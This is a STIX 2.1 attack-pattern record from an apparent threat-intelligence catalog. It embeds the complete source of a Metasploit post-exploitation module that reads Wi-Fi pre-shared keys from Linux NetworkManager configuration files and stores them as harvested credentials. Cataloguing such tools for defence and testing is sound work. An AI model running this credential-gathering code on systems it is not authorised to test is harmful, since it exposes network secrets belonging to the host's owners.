{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6501e53-b4e8-4760-9671-4b9e0766f4f8",
    "created": "2024-08-14T16:33:17.302824Z",
    "modified": "2024-08-14T16:33:17.302827Z",
    "name": "Linux Gather NetworkManager 802-11-Wireless-Security Credentials",
    "description": " This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from Linux NetworkManager connection configuration files.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_psk.rb",
            "external_id": "enum_psk.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather NetworkManager 802-11-Wireless-Security Credentials',\n        'Description' => %q{\n          This module collects 802-11-Wireless-Security credentials such as\n          Access-Point name and Pre-Shared-Key from Linux NetworkManager\n          connection configuration files.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Cenk Kalpakoglu'],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('DIR', [true, 'The path for NetworkManager configuration files', '/etc/NetworkManager/system-connections/'])\n    ])\n  end\n\n  def connections_directory\n    datastore['DIR']\n  end\n\n  def extract_psk_from_file(path)\n    return if path.blank?\n\n    print_status(\"Reading file #{path}\")\n    data = read_file(path)\n\n    return if data.blank?\n\n    data.each_line do |l|\n      next unless l.starts_with?('psk=')\n\n      psk = l.split('=')[1].strip\n\n      return psk unless psk.blank?\n    end\n\n    nil\n  end\n\n  def run\n    unless is_root?\n      fail_with(Failure::NoAccess, 'You must run this module as root!')\n    end\n\n    connection_files = dir(connections_directory)\n\n    if connection_files.blank?\n      print_status('No network connections found')\n      return\n    end\n\n    tbl = Rex::Text::Table.new({\n      'Header' => '802-11-wireless-security',\n      'Columns' => ['AccessPoint-Name', 'PSK'],\n      'Indent' => 1\n    })\n\n    connection_files.each do |f|\n      psk = extract_psk_from_file(\"#{connections_directory}/#{f}\")\n      tbl << [f, psk] unless psk.blank?\n    end\n\n    if tbl.rows.empty?\n      print_status('No wireless PSKs found')\n      return\n    end\n\n    print_line(\"\\n#{tbl}\")\n\n    p = store_loot(\n      'linux.psk.creds',\n      'text/csv',\n      session,\n      tbl.to_csv,\n      'wireless_credentials.txt'\n    )\n\n    print_good(\"Credentials stored in: #{p}\")\n\n    tbl.rows.each do |cred|\n      user = cred[0] # AP name\n      password = cred[1]\n      create_credential(\n        workspace_id: myworkspace_id,\n        origin_type: :session,\n        address: session.session_host,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: user,\n        private_data: password,\n        private_type: :password\n      )\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}